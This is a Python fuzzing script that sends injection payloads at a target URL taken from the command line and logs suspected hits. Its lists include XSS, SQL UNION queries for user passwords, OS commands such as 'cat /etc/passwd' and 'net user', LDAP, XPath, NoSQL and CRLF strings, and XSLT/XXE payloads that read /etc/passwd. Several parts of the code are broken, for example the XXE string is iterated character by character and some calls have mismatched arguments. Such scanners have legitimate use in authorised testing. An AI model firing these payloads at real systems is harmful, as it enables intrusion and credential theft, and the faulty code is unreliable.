import requests
import json
import sys
import time
import datetime
from typing import List
from ldap3 import Server, Connection, ALL
from lxml import etree
from fuzz_logger import FuzzLogger, log_result, save
from error_utils import show_error_contents


# テスト用ペイロードの定義
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\")'>"
    ]
SQL_PAYLOADS = [ 
    "'",
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username, password FROM users--"
    ]
OS_COMMAND_PAYLOADS = [
    "; ls",
    "&& ls",
    "| ls",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "& whoami",
    "| whoami",
    "& net user"
    ]
NO_SQL_PAYLOADS = [
    '{ "username": { "$ne": "" } }',
    '{ "username": "admin", "password": { "$ne": "" } }',
    '{ "$where": "this.username == \\"admin\\" && this.password != \\"password\\""}',
    '{ "username": { "$gt": "" } }',
    '{ "username": null, "password": { "$ne": null } }'
]
HEADER_PAYLOADS = [
    "test\r\nInjected-Header: injected_value",
    "test\nX-Injected: injected_value",
    "\r\nSet-Cookie: test=1",
    "%0d%0aContent-Length:0%0d%0aInjected-Header: injected_value"
]
JSON_PAYLOADS = [
    '"; "role":"admin',
    '"}, "role":"admin',
    '", "role": "admin}',
    '"<script>alert(1)</script>',
    '"username": "admin", "password": {"$ne": null}',
    '{"username": "admin", "role": {"$gt": "user"}}'
]
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: admin=true",
    "%0d%0aContent-Length: 0%0d%0aInjected-Header: test",
    "\r\nLocation: https://malicious.com",
    "\nX-Test: injected_value"
]
LDAP_PAYLOADS = [
    "*)(&(objectClass=*))",
    "*)|(&(objectCategory=person)(objectClass=user))",
    "*)(&(objectCategory=person)(cn=*))",
    "*))(|(objectClass=*))",
    "*)(uid=*))(|(uid=*))"
]
UNICODE_PAYLOADS = [
    "%u0027",
    "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
    "%u003Cimg src=x onerror=alert(1)%u003E",
    "%u003Cbody onload=alert(1)%u003E"
]
XPATH_PAYLOADS = [
    "admin' or '1'='1",
    "' or 1=1 or ''='",
    "' and count(/*)=1 and ''='",
    "' union /user[name/text()='admin']/password/text() and ''='"
]
XSLT_PAYLOADS = [
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="system-property('os.name')"/>
      </xsl:template>
    </xsl:stylesheet>
    ''',
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="document('file:///etc/passwd')"/>
      </xsl:template>
    </xsl:stylesheet>
    '''
]
XXE_PAYLOADS = """
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
"""


# ロガー初期化(本日日付でログファイルを生成)
today_str = datetime.datetime.now().strftime("%Y-%m-%d")
logger = FuzzLogger(filename=f"output/fuzz_{today_str}.json", overwrite=True)


# ファジング関数
def fuzz(url: str, base_params: dict[str, str], target_param: str, payloads: list[str] = None) -> None:
    if payloads is None:
        payloads = XSS_PAYLOADS + OS_COMMAND_PAYLOADS


    #比較用のレスポンステキスト
    try:
        response = requests.get(url, params=base_params)
        result = response.text
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return

    for payload in payloads:
        test_params = base_params.copy()
        test_params[target_param] = payload
        try:
            response_pattern = requests.get(url, params=test_params)
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern.text)
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=False,
                        fuzzing_results="Status mismatch or WAF triggered",
                        error_contents=error_info
                    )
                else:
                    print(f'Found Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code} ")
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=True,
                        fuzzing_results="Found Injection",
                        error_contents=None
                    )
            else:
                print(f'Not Found | {payload}')

        except Exception as e:
            print(f"Error with payload {payload}: {e}") 
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_detected=False,
                fuzzing_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save() 

        
# ログインフォームのためのファジング関数
def fuzz_login(url: str, username_field: str, password_field: str, payload: str = None) -> None:
    for payload in SQL_PAYLOADS:
        data = {
            username_field: payload,
            password_field: "dummy"
        }
        print(f"Set Username: {payload} | Password: 'dummy' password")
        try:
            response_pattern = requests.post(url, data=data)
            if "invalid" not in response_pattern.text.lower():
                if response_pattern.status_code == 200:
                    print(f"Possible | username: {payload}")
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=True,
                        fuzzing_results="Found Username Injection",
                        error_contents=None
                    )
                else:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=False,
                        fuzzing_results="Status mismatch or WAF triggered",
                        error_contents=error_info
                    )
            else:
                print(f"No Possible | username : {payload}")
        except Exception as e:
            print(f"Error username form: {payload}）: {e}")
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save()

    for payload in SQL_PAYLOADS:
        data = {
            username_field: "dummy",
            password_field: payload
        }
        print(f"Set Username: 'dummy' username | Password: {payload}")
        try:
            response_pattern = requests.post(url, data=data)
            if "invalid" not in response_pattern.text.lower():
                if response_pattern.status_code == 200: 
                    print(f"Possible | password: {payload}")
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=True,
                        fuzzing_results="Found Password Injection",
                        error_contents=None
                    )
                else:
                   print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)") 
                   error_info = show_error_contents(response_pattern)
                   logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=False,
                        fuzzing_results="Status mismatch or WAF triggered",
                        error_contents=error_info
                    )
            else:
                print(f"No Possible | password: {payload}")
        except Exception as e:
            print(f"Error password form: {payload}）: {e}")
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save()


# NoSQLインジェクション
def test_nosql_injection(url :str) -> None:
    
    #比較用のレスポンステキスト
    try:
        response = requests.get(url)
        result = response.text
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return


    headers = {'Content-Type': 'application/json'}
    for payload in NO_SQL_PAYLOADS:
        try:
            payload_json = json.loads(payload)
            response_pattern = requests.post(url, json=payload_json, headers=headers)
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=False,
                        fuzzing_results="Status mismatch or WAF triggered",
                        error_contents=error_info
                    )
                else:
                    print(f'Found NoSQL Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=True,
                        fuzzing_results="Found NoSQL Injection",
                        error_contents=None
                    )
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_detected=False,
                fuzzing_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save()

# CSTIテスト関数
def test_csti(url: str) -> None:
    #比較用のレスポンステキスト
    try:
        response = requests.get(url)
        result = response.text
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return
    
    CSTI_PAYLOADS = ["${7*7}"]
    for payload in CSTI_PAYLOADS:
        try:
            response_pattern = requests.get(url, params={"name": payload})
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code :
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=False,
                        fuzzing_results="Status mismatch or WAF triggered",
                        error_contents=error_info
                    )
                else:
                    print(f'Found CSTI Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=response_pattern.status_code,
                        response_body=response_pattern.text,
                        injection_detected=True,
                        fuzzing_results="Found CSTI Injection",
                        error_contents=None
                    )
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_detected=False,
                fuzzing_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save() 


# HTTP Header Injecion 
def test_header_injection(url: str) -> None:
    #それぞれのヘッダーフォームを検証
    header_keys = [
        "User-Agent", "Referer", "X-Forwarded-For", "Injected-Header"
    ]
    
    # 比較用のレスポンステキスト
    try:
        response = requests.get(url)
        result = response.text
        baseline_headers = response.headers #ヘッダー破損の変化も含める
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return

    for payload in HEADER_PAYLOADS:
        for key in header_keys:
            headers = {
                key: payload
            }
            
            try:
                response_pattern = requests.get(url, headers=headers)
                baseline_headers_pattern = response_pattern.headers
                
                if response_pattern.text != result or baseline_headers_pattern != baseline_headers: 
                    if response_pattern.status_code != response.status_code:
                        print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                        print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code} | Response Headers: {response_pattern.status_code}")
                        error_info = show_error_contents(response_pattern)
                        logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=False,
                            fuzzing_results="Status mismatch or WAF triggered",
                            error_contents=error_info
                        )
                    else:
                        print(f'Found HTTP Header Injection')
                        print(f"Tested with payload: {payload}")
                        print(f"Status Code: {response_pattern.status_code}")
                        print(f"Response Headers: {response_pattern.headers}")
                        logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=True,
                            fuzzing_results="Found HTTP Header Injection",
                            error_contents=None
                        )
                else:
                    print(f'Not Found | {payload}')
            except Exception as e:
                print(f"Error with payload {payload}: {e}")
                logger.log_result(
                    target_url=url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
                )

        logger.save() 

# LDAPインジェクション
def test_ldap_injection(server_url: str, base_dn: str) -> None:
    server = Server(server_url, get_info=ALL)
    conn = Connection(server)
    if not conn.bind():
        print("Bind failed.")
        logger.log_result(
            target_url=server_url,
            paylaod=None,
            response_code=None,
            response_body=None,
            injection_detected=False,
            fuzzing_results="Bind failed",
            error_contents=None
        )
        return

    for payload in LDAP_PAYLOADS:
        try:
            search_filter = f"(uid={payload})"
            conn.search(search_base=base_dn, search_filter=search_filter, attributes=["cn", "mail", "uid", "telephoneNumber"])
            if conn.entries:
                print(f"[+] Injection possible with payload: {payload}")
                for entry in conn.entries:
                    print(f" - {entry}")
                    logger.log_result(
                        target_url=server_url,
                        payload=payload,
                        response_code=None,
                        response_body=None,
                        injection_detected=True,
                        fuzzing_results="Found LDAP Injection"
                    )
            else:
                print(f"[-] No result for: {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")
            logger.log_result(
                    target_url=server_url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
                )
    conn.unbind()

    logger.save()


#LDAPインジェクションにおけるURLのドメイン、拡張子の分離
def split_domain(target_url: str) -> tuple[str, str]:
    # ドットを基準に分割
    parts = target_url.rsplit('.', 1)  # 右から1回だけ分割

    if len(parts) == 2:
        domain, extension = parts
        return domain, extension
    else:
        return target_url, ""  # 拡張子がない場合



# JSONインジェクション　
def test_json_injection(url: str, base_data: dict[str, str]) -> None:
    headers = {
        "Content-Type": "application/json"
    }

    #比較用のレスポンステキスト
    try:
        response = requests.get(url)
        result = response.text
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return

    for payload in JSON_PAYLOADS:
        data = base_data.copy()
        data["username"] = payload

        try:
            response_pattern = requests.post(url, data=json.dumps(data), headers=headers)
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=False,
                            fuzzing_results="Status mismatch or WAF triggered",
                            error_contents=error_info
                        )
                else:
                    print(f"Potential vulnerability found with payload: {payload}\n")
                    print(f"Tested with payload: {payload}")
                    print(f"Status Code: {response_pattern.status_code}")
                    print(f"Response Text: {response_pattern.text}")
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=True,
                            fuzzing_results="Found JSON Injection",
                            error_contents=None
                        )
            else:
                print(f"Not found | {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")
            logger.log_result(
                    target_url=url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
                )
            
        logger.save()
            

#CRLFインジェクション
def test_crlf_injection(url: str) -> None:
    for payload in CRLF_PAYLOADS:
        
        #比較用のレスポンステキスト
        try:
            response = requests.get(url)
            result = response.text
        except Exception as e:
            print(f"[Error] Failed to fetch baseline: {e}")
            return

        try:
            response_pattern = requests.get(url, params={"q", payload})

            # レスポンスヘッダーにペイロードが含まれていれば脆弱性が存在する可能性
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=False,
                            fuzzing_results="Status mismatch or WAF triggered",
                            error_contents=error_info
                        )
                else:
                    print(f"Potential CRLF Injection with payload: {payload}")
                    print(f"Tested payload: {payload}")
                    print(f"Status Code: {response_pattern.status_code}")
                    print(f"Response Headers: {response_pattern.headers}")
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=True,
                            fuzzing_results="Found CRLF Injection",
                            error_contents=None
                        )
            else:
                print(f"Not found {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")
            logger.log_result(
                    target_url=url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
                )
            
        logger.save()

#unicodeインジェクション
def test_unicode_injection(url: str, param: str) -> None:
    for payload in UNICODE_PAYLOADS:
        
        #比較用のレスポンステキスト
        try:
            response = requests.get(url)
            result = response.text
        except Exception as e:
            print(f"[Error] Failed to fetch baseline: {e}")
            return

        try:
            params = {param: "admin" + payload}
            response_pattern = requests.get(url, params=params)
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=False,
                                fuzzing_results="Status mismatch or WAF triggered",
                                error_contents=error_info
                            )

                else:
                    print(f"Potential Unicode Injection with payload: {payload}")
                    print(f"Tested with payload: {payload}")
                    print(f"Status Code: {response_pattern.status_code}")
                    print(f"Response Text: {response_pattern.text}")
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=True,
                                fuzzing_results="Found Unicode Injection",
                                error_contents=None
                            )
            else:
                print(f"Not found {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")
            logger.log_result(
                    target_url=url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
                )
            
        logger.save()

#XPathインジェクション検証　　
def test_xpath_injection(url: str) -> None:
    for payload in XPATH_PAYLOADS:
        # 脆弱なXPathクエリ
        query = f"//user[username='{payload}']/password"

        try:
            #比較用のレスポンステキスト
            response = requests.get(url,  headers={'Content-Type': 'application/xml'})
            result = response.text
        except Exception as e:
            print(f"[Error] Failed to fetch baseline: {e}")
            return

        try:
            response_pattern = requests.get(url, params=query,  headers={'Content-Type': 'application/xml'})
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=False,
                                fuzzing_results="Status mismatch or WAF triggered",
                                error_contents=error_info
                            )

                else:
                    print(f'Found XPath Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=True,
                                fuzzing_results="Found XPath Injection",
                                error_contents=None
                            )
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 
            logger.log_result(
                        target_url=url,
                        payload=payload,
                        response_code=None,
                        response_body=str(e),
                        injection_detected=False,
                        fuzzing_results="Request exception occurred",
                        error_contents=[str(e)]
                    )

        logger.save()
        
    
#XSLTインジェクション検証
def test_xslt_injection(url: str) -> None:
   for payload in XSLT_PAYLOADS:
        # XSLTのパース
        xslt_root = etree.XML(payload)
        xslt_doc = etree.XSLT(xslt_root)
            
        #比較用のレスポンステキスト
        try:
            response = requests.get(url,  headers={'Content-Type': 'application/xml'})
            result = response.text
        except Exception as e:
            print(f"[Error] Failed to fetch baseline: {e}")
            return

        try:
            response_pattern = requests.get(url, xslt_doc, headers={'Content-Type': 'application/xml'})
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=False,
                                fuzzing_results="Status mismatch or WAF triggered",
                                error_contents=error_info
                            )
                else:
                    print(f'Found XSLT Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    logger.log_result(
                                target_url=url,
                                payload=payload,
                                response_code=response_pattern.status_code,
                                response_body=response_pattern.text,
                                injection_detected=True,
                                fuzzing_results="Found XSLT Injection",
                                error_contents=None
                            )
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 
            logger.log_result(
                    target_url=url,
                    payload=payload,
                    response_code=None,
                    response_body=str(e),
                    injection_detected=False,
                    fuzzing_results="Request exception occurred",
                    error_contents=[str(e)]
            )
        logger.save()
    

#XXE 検証　
def test_xxe(url: str) -> None:
    
    # ベースラインレスポンスの取得(空のXML送信)
    try:
        baseline_xml = "<root>test</root>"
        response = requests.post(
            url,
            data=baseline_xml.encode('utf-8'),
            headers={'Content-Type': 'application/xml'},
            timeout=10
        )
        result = response.text
    except Exception as e:
        print(f"[Error] Failed to fetch baseline: {e}")
        return


    for payload in XXE_PAYLOADS:
        try:
            response_pattern = requests.post(url, data=payload.encode('utf-8'),  headers={'Content-Type': 'application/xml'}, timeout=10 )
            
            if response_pattern.text != result:
                if response_pattern.status_code != response.status_code:
                    print(f"Exception Result (ex. WAF protector, Server Error or IP Restriction)")
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    error_info = show_error_contents(response_pattern)
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=False,
                            fuzzing_results="Status mismatch or WAF triggered",
                            error_contents=error_info
                        )
                else:
                    print(f'Found XXE Injection')
                    print(f"Tested payload: {payload}| Response Data {response_pattern.text} | Status Code: {response_pattern.status_code}")
                    logger.log_result(
                            target_url=url,
                            payload=payload,
                            response_code=response_pattern.status_code,
                            response_body=response_pattern.text,
                            injection_detected=True,
                            fuzzing_results="Found XXE Injection",
                            error_contents=None
                        )
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 
            logger.log_result(
                target_url=url,
                payload=payload,
                response_code=None,
                response_body=str(e),
                injection_detected=False,
                fuzzing_results="Request exception occurred",
                error_contents=[str(e)]
            )

        logger.save()
        




if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python fuzzing.py <URL> or python fuzzing.py <URL> [username_field]  [password_field] [query_field]  " \
        "You can enter username_field and password_field, query_field parameters! Defaultly set initial username password query"\
        )
        sys.exit(1)

    target_url = sys.argv[1]

    #デフォルト値を設定
    username_field = "username"
    password_field = "password"
    query_field = "q"

    #引数が指定されていれば上書き
    if len(sys.argv) >= 4:
        username_field = sys.argv[2]
        password_field = sys.argv[3]
        query_field = sys.argv[4]

    
    print(f"Target URL: {target_url}")
    print(f"Username Field: {username_field}")
    print(f"Password Field: {password_field}")
    print(f"Query Field: {query_field}")
    
    time.sleep(2)

    print("=== XSS SQL OS Injection Test === ")

    print("=== Fuzzing ===")
    fuzz(target_url, base_params={query_field: "test"}, target_param=query_field )

    time.sleep(2)

    print("=== Fuzzing login ===")
    fuzz_login(target_url, username_field,  password_field)

    print("=== NoSQL Injection Test ===") 
    test_nosql_injection(target_url)

    print("=== CSTI Test ===")
    test_csti(target_url)

    print("=== HTTP Header Injection Test ===")
    headers = {"User-Agent": "test"}  
    test_header_injection(target_url, headers)
    
    time.sleep(2)

    print("=== LDAP Injection ===") 
    if "ldap://" in target_url:
        print("contain 'ldap://' ")  
        domain, extension = split_domain(target_url.replace("ldap://", ""))
        base_dn = f"dc={domain},dc={extension}"
        test_ldap_injection(target_url, base_dn)
    else:
        print("This url do not contain ldap")
    
    print("=== JSON Injecion Test ===")
    base_data = {
        username_field: "test",
        "role": "user"
    }
    test_json_injection(target_url, base_data)

    print("=== CSLF Injection Test ===")
    test_crlf_injection(target_url)

    print("=== Unicode Injection Test ===")
    test_unicode_injection(target_url) 
    
    time.sleep(2)

    print("=== XPath Injection Test ===") 
    test_xpath_injection(target_url)

    print("=== XSLT Injection Test ===") 
    test_xslt_injection(target_url)

    print("=== XXE Test ===") 
    test_xxe(target_url)
    

    print("Finish check!")